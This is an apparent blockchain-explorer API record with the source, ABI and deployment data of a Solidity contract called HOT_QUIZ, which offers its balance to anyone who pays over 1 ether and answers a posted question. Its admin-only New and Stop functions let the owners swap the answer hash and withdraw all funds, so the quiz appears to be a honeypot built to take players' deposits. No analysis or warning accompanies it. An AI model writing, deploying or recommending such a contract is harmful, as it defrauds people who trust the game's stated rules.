{"status": "1", "message": "OK", "result": [{"SourceCode": "contract HOT_QUIZ\r\n{\r\n    function Try(string memory _response) public payable\r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(abi.encode(_response)) && msg.value > 1 ether)\r\n        {\r\n            payable(msg.sender).transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    string public question;\r\n\r\n    bytes32 responseHash;\r\n\r\n    mapping (bytes32=>bool) admin;\r\n\r\n    function Start(string calldata _question, string calldata _response) public payable isAdmin{\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(abi.encode(_response));\r\n            question = _question;\r\n        }\r\n    }\r\n\r\n    function Stop() public payable isAdmin {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function New(string calldata _question, bytes32 _responseHash) public payable isAdmin {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] memory admins) {\r\n        for(uint256 i=0; i< admins.length; i++){\r\n            admin[admins[i]] = true;\r\n        }\r\n    }\r\n\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(abi.encodePacked(msg.sender))]);\r\n        _;\r\n    }\r\n\r\n    fallback() external {}\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"admins\",\"type\":\"bytes32[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"bytes32\",\"name\":\"_responseHash\",\"type\":\"bytes32\"}],\"name\":\"New\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_question\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Start\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Stop\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_response\",\"type\":\"string\"}],\"name\":\"Try\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"question\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HOT_QUIZ", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000031cf23ecb6f8ef0f96597ac26f6160b79bf326486e16505c6d8b8dee61c36738b8ff97a843dbcb3edf468097e3ebed8c99ab559c1aab2eded0864fbca64e0c9f730722baa861f4e10b4d736e65652cf91b65549b519f9ccbb5399853b05ac8730", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://c28ac45cdb57493f7dbbadb77a4de36cf1bf8e9e048bbbd32a4b550d67239eb8"}]}